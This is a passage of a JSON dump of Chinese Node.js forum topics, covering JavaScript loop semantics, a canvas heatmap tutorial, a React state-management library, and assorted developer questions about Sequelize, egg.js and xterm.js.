console.log(array[key])\n}\n</code></pre><h4>实际应用的问题</h4>\n<p><strong>通常情况下，不建议使用 for-in 来遍历数组，除非你知道这个数组对象中没有这样的属性</strong></p>\n<h3>数组空项</h3>\n<p>假设要遍历的数组张这样：<code>array = ['a', , 'c']</code></p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; a undefined c\nfor (let index = 0; index &lt; array.length; index++) {\n    const element = array[index]\n    console.log(element) &#x2F;&#x2F; 没有跳过空值\n}\n\n&#x2F;&#x2F; a c\narray.forEach(element =&gt; {\n    console.log(element) &#x2F;&#x2F; 跳过空值\n})\n\n&#x2F;&#x2F; a c\nfor (const key in array) {\n    console.log(array[key]) &#x2F;&#x2F; 跳过空值\n}\n\n&#x2F;&#x2F; a undefined c\nfor (const iterator of array) {\n    console.log(iterator) &#x2F;&#x2F; 没有跳过空值\n}\n</code></pre><p>上面几个遍历方法，只有 forEach 和 for-in 遍历会跳过空值，值得注意的是，如果空值明确设置为 undefined 如 <code>['a', undefined, 'c']</code> 那么所有遍历方法都能够将 undefined 遍历出来</p>\n<h3>实际应用的问题</h3>\n<p>在 JSON 中是不支持这样的空值的，如果在 parse 方法调用时传入的 JSON 字符串数据含有空值，会报错：</p>\n<pre class=\"prettyprint language-js\"><code>JSON.parse(&#x27;[&quot;a&quot;, , &quot;c&quot;]&#x27;)\n&#x2F;&#x2F; 所以建议使用 for-of 或 for 循环进行遍历，因为如果\n</code></pre><ul>\n<li>stringify 方法调用时，空值会被转为 null 非空值或 undefined</li>\n<li>正确的做法应该是保持 undefined，遍历使用 for-of 或 for 循环</li>\n</ul>\n<p><strong>建议使用 for-of</strong></p>\n<h3>方法 this 指向的上下文</h3>\n<p>在 forEach 中需要传入一个函数，这个函数的 this 指向因语法形式而变化：</p>\n<pre class=\"prettyprint language-js\"><code>for (let index = 0; index &lt; array.length; index++) {\n    const element = array[index]\n    console.log(this) &#x2F;&#x2F; {}\n}\n\narray.forEach(function (element) {\n    console.log(this) &#x2F;&#x2F; undefined\n})\n\narray.forEach(element =&gt; {\n    console.log(this) &#x2F;&#x2F; {}\n})\n\nfor (const key in array) {\n    console.log(this) &#x2F;&#x2F; {}\n}\n\nfor (const iterator of array) {\n    console.log(this) &#x2F;&#x2F; {}\n}\n</code></pre><p>上述遍历写法，只有 forEach 在传入非箭头函数的时候会出现不一致的情况</p>\n<p><strong>建议使用箭头函数</strong></p>\n<h3>Async/Await</h3>\n<p>async 异步编程中 forEach 则不会按照预期执行，如下：</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; a undefined c\n{(async () =&gt; {\n    for (const iterator of array) {\n        const result = await new Promise(res =&gt; setTimeout(() =&gt; { res(iterator) }, 1000))\n        console.log(result)\n    }\n})()}\n\n&#x2F;&#x2F; a c\n{(async () =&gt; {\n    for (const key in array) {\n        const result = await new Promise(res =&gt; setTimeout(() =&gt; { res(array[key]) }, 1000))\n        console.log(result)\n    }\n})()}\n\n&#x2F;&#x2F; a undefined c\n{(async () =&gt; {\n    for (let index = 0; index &lt; array.length; index++) {\n        const result = await new Promise(res =&gt; setTimeout(() =&gt; { res(array[index]) }, 1000))\n        console.log(result)\n    }\n})()}\n\n&#x2F;&#x2F; 语法错误\n{(async () =&gt; {\n    array.forEach(element =&gt; {\n        const result = await new Promise(res =&gt; setTimeout(() =&gt; { res(element) }, 1000))\n        console.log(result)\n    })\n})()}\n</code></pre><p>按照上述写法 forEach 会报错，首先看一下 forEach 的原理：</p>\n<p>本质上 forEach 就像一个 for 循环的包装：</p>\n<pre class=\"prettyprint language-js\"><code>Array.prototype.forEach = function (callback) {\n  for (let index = 0; index &lt; this.length; index++) {\n    callback(this[index], index, this)\n  }\n}\n</code></pre><p>如果按照上述写法，那么在回调函数内部调用 await 需要这个回调函数本身也是 async 函数，因此改为如下写法：</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; 语法错误\n{(async () =&gt; {\n    array.forEach(async element =&gt; {\n        const result = await new Promise(res =&gt; setTimeout(() =&gt; { res(element) }, 1000))\n        console.log(result)\n    })\n})()}\n</code></pre><p>按照这样写法，forEach 最后会变成并行执行，而非串行。</p>\n<p><strong>因此建议使用 for-of 循环</strong></p>\n<p><strong>或者创建一个 forEachAwait 方法：</strong></p>\n<pre class=\"prettyprint language-js\"><code>async function forEachAwait(arr, cb) {\n    for (let index = 0; index &lt; array.length; index++) {\n        await cb(arr[index], index, arr)\n    }\n}\n\n&#x2F;&#x2F; a undefined c\n{(async () =&gt; {\n    forEachAwait(array, async (elem) =&gt; {\n        const result = await new Promise(res =&gt; setTimeout(() =&gt; { res(elem) }, 1000))\n        console.log(result)\n    })\n})()}\n</code></pre><h2>参考：</h2>\n<ul>\n<li><a href=\"http://thecodebarbarian.com/for-vs-for-each-vs-for-in-vs-for-of-in-javascript.html\">For vs forEach() vs for/in vs for/of in JavaScript</a></li>\n</ul>\n<p>订阅我的公众号：</p>\n<p><img src=\"https://i.loli.net/2019/02/28/5c778bbe7d90d.png\" alt></p>\n</div>","title":"一文彻底弄懂 for forEach for-in for-of 的区别","last_reply_at":"2019-02-28T07:27:37.254Z","good":false,"top":false,"reply_count":0,"visit_count":522,"create_at":"2019-02-28T07:27:37.254Z","author":{"loginname":"oliyg","avatar_url":"https://avatars1.githubusercontent.com/u/19631785?v=4&s=120"}},{"id":"5c765c94ab86b86ddf6b374e","author_id":"5ab1e8e8e7b166bb7b9ecca9","tab":"ask","content":"<div class=\"markdown-text\"><h2>underscored</h2>\n<p>underscored为true或者flase都尝试过了</p>\n<h2>field也不行</h2>\n<h2>sql</h2>\n<pre class=\"prettyprint\"><code>CREATE TABLE &#96;user&#96; (\n  &#96;id&#96; int(11) NOT NULL AUTO_INCREMENT COMMENT &#x27;用户id&#x27;,\n  &#96;username&#96; varchar(255) DEFAULT NULL COMMENT &#x27;用户名&#x27;,\n  &#96;password&#96; varchar(255) DEFAULT NULL COMMENT &#x27;用户密码&#x27;,\n  &#96;created_at&#96; datetime DEFAULT NULL COMMENT &#x27;创建时间&#x27;,\n  &#96;updated_at&#96; datetime DEFAULT NULL COMMENT &#x27;更改时间&#x27;,\n  &#96;role_id&#96; int(11) DEFAULT NULL,\n  PRIMARY KEY (&#96;id&#96;),\n  UNIQUE KEY &#96;username&#96; (&#96;username&#96;)\n) ENGINE=InnoDB  DEFAULT CHARSET=utf8mb4 COMMENT=&#x27;用户表&#x27;;\n\n\n</code></pre><h2>定义</h2>\n<pre class=\"prettyprint\"><code>&#x27;use strict&#x27;;\n\nmodule.exports = app =&gt; {\n    const { INTEGER, STRING, DATE } = app.Sequelize;\n    const User = app.model.define(&#x27;user&#x27;, {\n        id: {\n            type: INTEGER,\n            primaryKey: true,\n            autoIncrement: true,\n        },\n        username: {\n            type: STRING,\n        },\n        password: {\n            type: STRING,\n        },\n        created_at: DATE,\n        updated_at: DATE,\n        role_id: {\n            type: INTEGER,\n            field: &#x27;roleId&#x27;,\n        },\n    }, {\n        freezeTableName: true,\n        underscored: false,\n    });\n    User.associate = function() {\n        app.model.User.belongsTo(app.model.Role, { as: &#x27;role&#x27; });\n    };\n    return User;\n};\n</code></pre><h2>报错</h2>\n<p><img src=\"//static.cnodejs.org/FmtsgUYP_fcHzq5mPuI1qhgNHxT4\" alt=\"image.png\"></p>\n</div>","title":"使用sequlise，在数据库中定义的下划线字段，怎么实现输出的时候字段都是驼峰形式","last_reply_at":"2019-02-28T00:44:36.624Z","good":false,"top":false,"reply_count":2,"visit_count":499,"create_at":"2019-02-27T09:47:00.632Z","author":{"loginname":"1134506391","avatar_url":"https://avatars2.githubusercontent.com/u/30287598?v=4&s=120"}},{"id":"5c765cf5a667ed6d807b9c81","author_id":"576a5d4063075514079b77e7","tab":"share","content":"<div class=\"markdown-text\"><p>翻译了一篇非常不错的外文，强烈推荐！！！强烈推荐！！！强烈推荐！！！</p>\n<p>论，如何在2019年修炼成一个高阶的前端开发者？</p>\n<p>这里有 <a href=\"https://www.liayal.com/article/5c6f5ed3c0ab13505eeefab7\">修炼宝典</a></p>\n</div>","title":"2019前端修炼宝典","last_reply_at":"2019-02-27T11:15:01.706Z","good":false,"top":false,"reply_count":1,"visit_count":735,"create_at":"2019-02-27T09:48:37.261Z","author":{"loginname":"MaelWeb","avatar_url":"https://avatars1.githubusercontent.com/u/7869311?v=4&s=120"}},{"id":"5b34d77c5c8f1ea723a56ac5","author_id":"5b235e6f57137f22415c4c46","tab":"ask","content":"<div class=\"markdown-text\"><p>fs.readdir<strong>递归遍历目录</strong>，在外层有知道什么时候完成的办法么？\n比如统计递归的时间，在结束后做一些事情等等。</p>\n</div>","title":"fs.readdir递归遍历目录，在外层有知道什么时候完成的办法么？","last_reply_at":"2019-02-27T09:33:34.767Z","good":false,"top":false,"reply_count":32,"visit_count":2741,"create_at":"2018-06-28T12:41:32.326Z","author":{"loginname":"bi-kai","avatar_url":"https://avatars0.githubusercontent.com/u/15070379?v=4&s=120"}},{"id":"5c60b47705cc322e7b137b3a","author_id":"5ae04357a86ec1f308ec251f","tab":"ask","content":"<div class=\"markdown-text\"><p>如何制作前端直接操作服务器数据的sdk? 就像微信小程序的云开发，前端操作数据库的API与后端操作数据库的API一样。</p>\n</div>","title":"如何制作前端直接操作服务器数据的sdk?","last_reply_at":"2019-02-27T09:09:11.196Z","good":false,"top":false,"reply_count":10,"visit_count":1119,"create_at":"2019-02-10T23:32:07.103Z","author":{"loginname":"yuquanH","avatar_url":"https://avatars1.githubusercontent.com/u/27963145?v=4&s=120"}},{"id":"5c6f5f3c33b0b629ac8441a0","author_id":"58d83c586f8b9bf02d1d0b1d","tab":"ask","content":"<div class=\"markdown-text\"><p>rt</p>\n</div>","title":"为什么微软这么厉害的公司，写出来的浏览器这么一般","last_reply_at":"2019-02-27T08:40:53.346Z","good":false,"top":false,"reply_count":12,"visit_count":1778,"create_at":"2019-02-22T02:32:28.627Z","author":{"loginname":"ResJay","avatar_url":"https://avatars0.githubusercontent.com/u/26635410?v=4&s=120"}},{"id":"5c75e512a667ed6d807b96ab","author_id":"5acd8806099b154dbeba00bb","tab":"ask","content":"<div class=\"markdown-text\"><p>各位大佬上午好,小弟在使用egg-logger的时候,想要采用阿里全家桶的SLS日志服务,但是egg-logger的格式不能被正确识别,各位大佬可否给出一个解决方案.小弟写的正则无法匹配到错误的行数.希望各位大佬帮忙解决\n<img src=\"//static.cnodejs.org/FnI5W4jf4QVIscB1zPlg7RCOIOB-\" alt=\"image.png\"></p>\n</div>","title":"尊敬的各位大佬们,想问一下关于egg-logger的问题","last_reply_at":"2019-02-27T08:12:25.789Z","good":false,"top":false,"reply_count":7,"visit_count":460,"create_at":"2019-02-27T01:17:06.781Z","author":{"loginname":"shenqidebaozi","avatar_url":"https://avatars1.githubusercontent.com/u/35397691?v=4&s=120"}},{"id":"5b769226944cb8340c27e161","author_id":"53210f5661ed405564023e05","tab":"ask","content":"<div class=\"markdown-text\"><p>想把所有规则都放一个文件里，但发现所有已定义的目录都是有相关功能的，总感觉放哪都不合适，最后直接在 app 同级目录下建了个 validate 目录里面创建一个文件来存放，如下：</p>\n<pre class=\"prettyprint language-js\"><code>exports.LOGIN = {\n  name: {\n    type: &#x27;string&#x27;,\n    require: true,\n    allowEmpty: false\n  },\n  password: {\n    type: &#x27;string&#x27;,\n    require: true,\n    allowEmpty: false\n  }\n};\n\nexports.ARTICLES = {\n  name: {\n    type: &#x27;string&#x27;,\n    require: true,\n    allowEmpty: false\n  },\n  password: {\n    type: &#x27;string&#x27;,\n    require: true,\n    allowEmpty: false\n  }\n};\n</code></pre><p>但这样子，这个文件改动并不会被监听，请问大家都是怎么搞的</p>\n</div>","title":"egg.js 中 validate 的最佳实践","last_reply_at":"2019-02-27T03:30:13.143Z","good":false,"top":false,"reply_count":7,"visit_count":1677,"create_at":"2018-08-17T09:15:18.557Z","author":{"loginname":"littledu","avatar_url":"https://avatars2.githubusercontent.com/u/1784673?v=4&s=120"}},{"id":"5c75f74dab86b86ddf6b32d6","author_id":"550973933135610a365b01fa","tab":"share","content":"<div class=\"markdown-text\"><p><a href=\"https://codepen.io/fantasticsoul/pen/QYeMje\">https://codepen.io/fantasticsoul/pen/QYeMje</a>\n<img src=\"https://user-gold-cdn.xitu.io/2019/2/27/1692cd38dd35997e?w=911&amp;h=760&amp;f=gif&amp;s=4460271\" alt></p>\n</div>","title":"react-control-center, 在线示例来了，试一试哦，你会爱上它","last_reply_at":"2019-02-27T02:34:53.685Z","good":false,"top":false,"reply_count":0,"visit_count":477,"create_at":"2019-02-27T02:34:53.685Z","author":{"loginname":"fantasticsoul","avatar_url":"https://avatars0.githubusercontent.com/u/7334950?v=4&s=120"}},{"id":"5c749cacab86b86ddf6b2cae","author_id":"58450b974c17b38d3543639c","tab":"share","content":"<div class=\"markdown-text\"><p>上班太闲了，撸了个看小说的插件，分享给大家</p>\n<p><img src=\"//static.cnodejs.org/Fll0HdKCvO5jYOYPxy97S_wetMu3\" alt=\"屏幕快照 2019-02-26 上午9.53.40.png\"></p>\n<p>A vscode extension for study</p>\n<p>插件地址: <a href=\"https://marketplace.visualstudio.com/items?itemName=renkun.reader\">https://marketplace.visualstudio.com/items?itemName=renkun.reader</a>\n<a href=\"https://github.com/my-soul/read-vscode-e\">github</a></p>\n<p>安装: 搜索插件：epub reader</p>\n<p>快速启动 ctl/cmd + 3</p>\n<h2>功能</h2>\n<ul>\n<li>支持字体大小，字体颜色#6a9955自定义</li>\n<li>阅读进度显示以及自动记录</li>\n<li>支持目录跳转</li>\n<li>书架编辑</li>\n</ul>\n<h2>书架编辑</h2>\n<p>由于vscode安全策略，书架编辑请在插件安装目录 [C:\\Users\\ 你的用户名.vscode\\extensions\\renkun.reader\\book] 下自行增删书本</p>\n<h2>notice</h2>\n<ul>\n<li>字体设置功能鼠标hover才出现在书本目录下面</li>\n<li>书籍目录在阅读界面上方</li>\n</ul>\n</div>","title":"vscode看小说插件","last_reply_at":"2019-02-26T10:20:16.184Z","good":false,"top":false,"reply_count":3,"visit_count":1010,"create_at":"2019-02-26T01:55:56.568Z","author":{"loginname":"my-soul","avatar_url":"https://avatars2.githubusercontent.com/u/12870303?v=4&s=120"}},{"id":"579ab34af0d4b46026ba55eb","author_id":"559f6bb9419f1e8a23a64163","tab":"ask","content":"<div class=\"markdown-text\"><p>express 的 app.locals 与res.locals是什么，主要用在哪些方面？</p>\n</div>","title":"express 的 app.locals 与res.locals是什么，有什么用？","last_reply_at":"2019-02-26T06:43:27.579Z","good":false,"top":false,"reply_count":4,"visit_count":9694,"create_at":"2016-07-29T01:37:14.565Z","author":{"loginname":"qimuyunduan","avatar_url":"https://avatars0.githubusercontent.com/u/3916574?v=3&s=120"}},{"id":"5a41fbcb9807389a1809f6ff","author_id":"581ffec9e90cfbec054d7710","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>本文作者：TalkingData 可视化工程师李凤禄</p>\n<p>编辑：Aresn</p>\n</blockquote>\n<p>inMap 是一款基于 canvas 的大数据可视化库，专注于大数据方向点线面的可视化效果展示。目前支持散点、围栏、热力、网格、聚合等方式；致力于让大数据可视化变得简单易用。</p>\n<h3>GitHub 地址：<a href=\"https://github.com/TalkingData/inmap\">https://github.com/TalkingData/inmap</a> (点个 Star 支持下作者吧！)</h3>\n<p>热力图这个名字听起来很高大上，其实等同于我们常说的密度图。</p>\n<p><img src=\"http://inmap.iviewui.com/article/1\" alt=\"image\"></p>\n<p>如图表示，红色区域表示分析要素的密度大，而蓝色区域表示分析要素的密度小。只要点密集，就会形成聚类区域。\n看到这么炫的效果，是不是自己也很想实现一把？接下来手把手实现一个热力（带你装逼带你飞、 哈哈），郑重声明：下面代码片段均来自 <a href=\"https://github.com/TalkingData/inmap\">inMap</a>。</p>\n<h3>准备数据</h3>\n<p>inMap 接收的是经纬度数据，需要把它映射到 canvas 的像素坐标，这就用到了墨卡托转换，墨卡托算法很复杂，以后我们会有单独的一篇文章来讲讲他的原理。经过转换，你得到的数据应该是这样的：</p>\n<pre class=\"prettyprint\"><code>[\n  {\n    &quot;lng&quot;: &quot;116.395645&quot;,\n    &quot;lat&quot;: 39.929986,\n    &quot;count&quot;: 6,\n    &quot;pixel&quot;: { &#x2F;&#x2F;像素坐标\n      &quot;x&quot;: 689,\n      &quot;y&quot;: 294\n    }\n  },\n  {\n    &quot;lng&quot;: &quot;121.487899&quot;,\n    &quot;lat&quot;: 31.249162,\n    &quot;count&quot;: 10,\n    &quot;pixel&quot;: { &#x2F;&#x2F;像素坐标\n      &quot;x&quot;: 759,\n      &quot;y&quot;: 439\n    }\n  },\n  ...\n]\n</code></pre><p>好了，我们得到转换后的像素坐标数据(x、y),就可以做下面的事情了。</p>\n<h3>创建 canvas 渐变填充</h3>\n<p>创建一个由黑到白的渐变圆</p>\n<pre class=\"prettyprint language-\"><code>let gradient = ctx.createRadialGradient(x, y, 0, x, y, radius);\ngradient.addColorStop(0, &#x27;rgba(0,0,0,1)&#x27;);\ngradient.addColorStop(1, &#x27;rgba(0,0,0,0)&#x27;);\nctx.fillStyle = gradient;\nctx.arc(x, y, radius, 0, Math.PI * 2, true);\n</code></pre><ul>\n<li>createRadialGradient() 创建线性的渐变对象</li>\n<li>addColorStop() 定义一个渐变的颜色带</li>\n</ul>\n<p>效果如图：\n<img src=\"http://inmap.iviewui.com/article/2\" alt=\"image\">\n那么问题就来了，如果每个数据权重值 count 不一样，我们该如何表示呢？</p>\n<h3>设置 globalAlpha</h3>\n<p>根据不同的count值设置不同的Alpha，假设最大的count的Alpha等于1，最小的count的Alpha为0，那么我根据count求出Alpha。</p>\n<pre class=\"prettyprint\"><code>let alpha = (count - minValue) &#x2F; (maxValue - minValue);\n</code></pre><p>然后我们代码如下：</p>\n<pre class=\"prettyprint\"><code>drawPoint(x, y, radius, alpha) {\n    let ctx = this.ctx;\n    ctx.globalAlpha = alpha; &#x2F;&#x2F;设置 Alpha 透明度\n    ctx.beginPath();\n    let gradient = ctx.createRadialGradient(x, y, 0, x, y, radius);\n    gradient.addColorStop(0, &#x27;rgba(0,0,0,1)&#x27;);\n    gradient.addColorStop(1, &#x27;rgba(0,0,0,0)&#x27;);\n    ctx.fillStyle = gradient;\n    ctx.arc(x, y, radius, 0, Math.PI * 2, true);\n    ctx.closePath();\n    ctx.fill();\n}\n</code></pre><p>效果跟上一个截图有很大区别，可以对比一下透明度的变化。\n<img src=\"http://inmap.iviewui.com/article/6\" alt=\"image\">\n（这么黑乎乎的一团，跟热力差距好大啊）</p>\n<p><img src=\"http://inmap.iviewui.com/article/3\" alt=\"image\"></p>\n<h3>重置 canvas 画布颜色</h3>\n<ul>\n<li>getImageData() 复制画布上指定矩形的像素数据</li>\n<li>putImageData() 将图像数据放回画布：</li>\n</ul>\n<p>getImageData()返回的数据格式如下：</p>\n<pre class=\"prettyprint\"><code>{\n  &quot;data&quot;: {\n    &quot;0&quot;: 0,   &#x2F;&#x2F;R\n    &quot;1&quot;: 128, &#x2F;&#x2F;G\n    &quot;2&quot;: 0,   &#x2F;&#x2F;B\n    &quot;3&quot;: 255, &#x2F;&#x2F;Aplah\n    &quot;4&quot;: 0, &#x2F;&#x2F;R\n    &quot;5&quot;: 128, &#x2F;&#x2F;G\n    &quot;6&quot;: 0,  &#x2F;&#x2F;B\n    &quot;7&quot;: 255, &#x2F;&#x2F;Aplah\n    &quot;8&quot;: 0,\n    &quot;9&quot;: 128,\n    &quot;10&quot;: 0,\n    &quot;11&quot;: 255,\n    &quot;12&quot;: 0,\n    &quot;13&quot;: 128,\n    &quot;14&quot;: 0,\n    &quot;15&quot;: 255,\n    &quot;16&quot;: 0,\n    &quot;17&quot;: 128,\n    &quot;18&quot;: 0,\n    &quot;19&quot;: 255,\n    &quot;20&quot;: 0,\n    &quot;21&quot;: 128,\n    &quot;22&quot;: 0\n    ...\n</code></pre><p>返回的数据是一维数组，每四个元素表示一个像素（rgba）值。</p>\n<h3>实现热力原理：读取每个像素的alpha值(透明度)，做一个颜色映射。</h3>\n<p>代码如下：</p>\n<pre class=\"prettyprint language-js\"><code>let palette = this.getColorPaint(); &#x2F;&#x2F;取色面板\nlet img = ctx.getImageData(0, 0, container.width, container.height);\n    let imgData = img.data;\n    let max_opacity = normal.maxOpacity * 255;\n    let min_opacity = normal.minOpacity * 255;\n    &#x2F;&#x2F;权重区间\n    let max_scope = (normal.maxScope &gt; 1 ? 1 : normal.maxScope) * 255;\n    let min_scope = (normal.minScope &lt; 0 ? 0 : normal.minScope) * 255;\n    let len = imgData.length;\n    for (let i = 3; i &lt; len; i += 4) {\n        let alpha = imgData[i]; \n        let offset = alpha * 4;\n        if (!offset) {\n            continue;\n        }\n        &#x2F;&#x2F;映射颜色\n        imgData[i - 3] = palette[offset];\n        imgData[i - 2] = palette[offset + 1];\n        imgData[i - 1] = palette[offset + 2];\n\n        &#x2F;&#x2F; 范围区间\n        if (imgData[i] &gt; max_scope) {\n            imgData[i] = 0;\n        }\n        if (imgData[i] &lt; min_scope) {\n            imgData[i] = 0;\n        }\n\n        &#x2F;&#x2F; 透明度\n        if (imgData[i] &gt; max_opacity) {\n            imgData[i] = max_opacity;\n        }\n        if (imgData[i] &lt; min_opacity) {\n            imgData[i] = min_opacity;\n        }\n    }\n    &#x2F;&#x2F;将设置后的像素数据放回画布\nctx.putImageData(img, 0, 0, 0, 0, container.width, container.height);\n</code></pre><p>创建颜色映射，一个好的颜色映射决定最终效果。\ninMap 创建一个长256px的调色面板：</p>\n<pre class=\"prettyprint\"><code>let paletteCanvas = document.createElement(&#x27;canvas&#x27;);\nlet paletteCtx = paletteCanvas.getContext(&#x27;2d&#x27;);\npaletteCanvas.width = 256;\npaletteCanvas.height = 1;\nlet gradient = paletteCtx.createLinearGradient(0, 0, 256, 1);\n</code></pre><p>inMap 默认颜色如下：</p>\n<pre class=\"prettyprint\"><code>this.gradient = {\n    0.25: &#x27;rgb(0,0,255)&#x27;,\n    0.55: &#x27;rgb(0,255,0)&#x27;,\n    0.85: &#x27;yellow&#x27;,\n    1.0: &#x27;rgb(255,0,0)&#x27;\n};\n</code></pre><p>将gradient颜色设置到调色面板对象中</p>\n<pre class=\"prettyprint\"><code>for (let key in gradient) {\n    gradient.addColorStop(key, gradientConfig[key]);\n}\n</code></pre><p>返回调色面板的像素点数据：</p>\n<pre class=\"prettyprint\"><code>return paletteCtx.getImageData(0, 0, 256, 1).data;\n</code></pre><p>创建出来的调色面板效果图如下：（看起来像一个渐变颜色条）</p>\n<p><img src=\"http://inmap.iviewui.com/article/4\" alt=\"image\"></p>\n<p>最终我们实现的热力图如下：</p>\n<p><img src=\"http://inmap.iviewui.com/article/5\" alt=\"image\"></p>\n<h3>下节预告</h3>\n<p>下一节，我们将重点介绍 inMap 文字避让算法的实现。</p>\n</div>","title":"你不知道的前端算法之热力图的实现","last_reply_at":"2019-02-26T04:25:25.146Z","good":false,"top":false,"reply_count":5,"visit_count":5057,"create_at":"2017-12-26T07:35:39.407Z","author":{"loginname":"icarusion","avatar_url":"https://avatars2.githubusercontent.com/u/5370542?v=4&s=120"}},{"id":"5c6f7f0e33b0b629ac8442e5","author_id":"5c6f777433b0b629ac8442b6","tab":"ask","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/FiHpigZPIp2AvvA2CQHmtvxTWyL4\" alt=\"Screenshot_20190222-123210.png\"></p>\n<p><a href=\"https://photos.google.com/share/AF1QipNiK_IQM4HrtI5_9uzfJmkC1-8-tYJs4BlilVm-3M2PoRud3YoJ2umWvKE3yQ45Ig?key=YzhoeWg1c1UwZXVyaUQ3QWNiOC1yX1N2YWlSNl9B\">类似视频</a></p>\n<h5>输入：abcdefg</h5>\n<p>第一次backspace，增加abcdef，\n下一次，abcde</p>\n<h5>xterm 目前不支持移动设备</h5>\n<p><a href=\"https://github.com/xtermjs/xterm.js/issues/675\">https://github.com/xtermjs/xterm.js/issues/675</a></p>\n<p>求问有什么办法</p>\n</div>","title":"xterm.js 安卓中文输入法，退格键会重复输入","last_reply_at":"2019-02-25T15:37:21.378Z","good":false,"top":false,"reply_count":1,"visit_count":633,"create_at":"2019-02-22T04:48:14.922Z","author":{"loginname":"hello00700","avatar_url":"https://avatars3.githubusercontent.com/u/47766245?v=4&s=120"}},{"id":"5c73889f33b0b629ac844db5","author_id":"590b033352c3650e042a7f9e","tab":"ask","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/Fgdt9mdk19UfFkNfqYqhzOVBZUGe\" alt=\"捕获.PNG\"></p>\n<p><img src=\"//static.cnodejs.org/FuwvkM6RkIPo-uQawuHohenHNgyj\" alt=\"image.png\"></p>\n<p>下载完  导航包  整个项目 都错了 初始化的项目都打不开  我去 我还啥都没操作  就单纯下载一个包而已   完全按照 React Navigation  文档说明   结果还是不行</p>\n<p>球各位大神解答</p>\n</div>","title":"React Navigation  按照文档使用 下载包以后 什么操作都没有  最基本的初始化项目都启动不了 如图所示：","last_reply_at":"2019-02-25T06:44:18.648Z","good":false,"top":false,"reply_count":2,"visit_count":538,"create_at":"2019-02-25T06:18:07.246Z","author":{"loginname":"wiscgazf","avatar_url":"https://avatars0.githubusercontent.com/u/26874662?v=4&s=120"}},{"id":"5c72104e33b0b629ac84495c","author_id":"550973933135610a365b01fa","tab":"share","content":"<div class=\"markdown-text\"><p>目录回顾</p>\n<ul>\n<li><a href=\"https://juejin.im/post/5c3ee445f265da6126386416\">启动cc</a></li>\n<li><a href=\"https://juejin.im/post/5c39d0c46fb9a049db735bf7\">动态配置模块</a></li>\n</ul>\n<hr>\n<h4>前言</h4>\n<h4>最初的react</h4>\n<blockquote>\n<p>react用户最初接触接触react时，一定被洗脑了无数次下面几句话</p>\n</blockquote>\n<ul>\n<li>数据驱动视图</li>\n<li>单向数据流</li>\n<li>组件化</li>\n</ul>\n<blockquote>\n<p>它们体现着react的精髓，最初的时候，我们接触的最原始的也是最多的触发react视图渲染就是<code>setState</code>，这个函数打开了通往react世界的大门，因为有了<code>setState</code>，我们能够赋予组件生命，让它们按照我们开发者的意图动起来了。<br>\n渐渐的我们发现，当我们的单页面应用组件越来越多的时候，它们各自的状态形成了一个个孤岛，无法相互之间优雅的完成合作，我们越来越需要一个集中式的状态管理方案，于是facebook提出了flux方案,解决庞大的组件群之间状态不统一、通信复杂的问题</p>\n</blockquote>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/23/169189825baa0ade?w=585&amp;h=215&amp;f=webp&amp;s=4422\" alt></p>\n<h4>状态管理来了</h4>\n<p>仅接着社区优秀的flux实现涌现出来，最终沉淀下来形成了庞大用户群的有<code>redux</code>，<code>mbox</code>等，本文不再这里比较cc与它们之间的具体差异，因为<code>cc</code>其实也是基于flux实现的方案，但是<code>cc</code>最大的特点是直接接管了<code>setState</code>，以此为根基实现整个<code>react-control-center</code>的核心逻辑，所以<code>cc</code>是对<code>react</code>入侵最小且改写现有代码逻辑最灵活的方案，整个<code>cc</code>内核的简要实现如下</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/23/16918a16713fcee9?w=1084&amp;h=502&amp;f=png&amp;s=59090\" alt>\n可以看到上图里除了<code>setState</code>，还有<code>dispatch</code>、<code>effect</code>，以及3个点，因为cc触发有很多种，这里只提及<code>setState</code>、<code>dispatch</code>和<code>effect</code>这3种能覆盖用户99%场景的方法，期待读完本文的你，能够爱上<code>cc</code>。</p>\n<hr>\n<h3>setState，<a href=\"https://codepen.io/fantasticsoul/pen/omKxqv\">在线示例代码</a></h3>\n<h4>一个普通的react组件诞生了，</h4>\n<p>以下是一个大家见到的最最普通的有状态组件,视图里包含了一个名字显示和input框输入，让用户输入新的名字</p>\n<pre class=\"prettyprint\"><code>class Hello extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { name:&#x27;&#x27; };\n  }\n  changeName = (e)=&gt;{\n    this.setState({name:e.currentTarget.value});\n  }\n  render() {\n    const {name} = this.state;\n    return (\n      &lt;div className=&quot;hello-box&quot;&gt;\n        &lt;div&gt;{this.props.title}&lt;&#x2F;div&gt;\n        &lt;input value={name} onChange={this.changeName} &#x2F;&gt;hello cc, I am {name} \n      &lt;&#x2F;div&gt;\n    )\n  }\n}\n\nclass App extends React.Component {\n  constructor(props) {\n    super(props);\n  }\n  render() {\n    return (\n      &lt;div className=&quot;app-box&quot;&gt;\n       &lt;Hello title=&quot;normal instance&quot;&#x2F;&gt;\n      &lt;&#x2F;div&gt;\n    )\n  }\n}\n\nReactDOM.render(&lt;App &#x2F;&gt;, document.getElementById(&#x27;app&#x27;));\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/2/23/16918b91e58dc87e?w=614&amp;h=122&amp;f=gif&amp;s=29455\" alt=\"如图所示\"></p>\n<h4>改造为cc组件</h4>\n<p>事实上声明一个cc组件非常容易，将你的react组件注册到cc，其他就交给cc吧,这里我们先在程序的第一行启动cc，声明一个<code>store</code></p>\n<pre class=\"prettyprint\"><code>cc.startup({\n  store:{name:&#x27;zzk&#x27;}\n});\n</code></pre><p>使用<code>cc.register</code>注册<code>Hello</code>为CC类</p>\n<pre class=\"prettyprint\"><code>const CCHello = cc.register(&#x27;Hello&#x27;,{sharedStateKeys:&#x27;*&#x27;})(Hello);\n</code></pre><p>然后让我们渲染出<code>CCHello吧</code></p>\n<pre class=\"prettyprint\"><code>class App extends React.Component {\n  constructor(props) {\n    super(props);\n  }\n  render() {\n    return (\n      &lt;div className=&quot;app-box&quot;&gt;\n       &lt;Hello title=&quot;normal instance&quot;&#x2F;&gt;\n       &lt;CCHello title=&quot;cc instance1&quot;&#x2F;&gt;\n       &lt;CCHello title=&quot;cc instance2&quot;&#x2F;&gt;\n      &lt;&#x2F;div&gt;\n    )\n  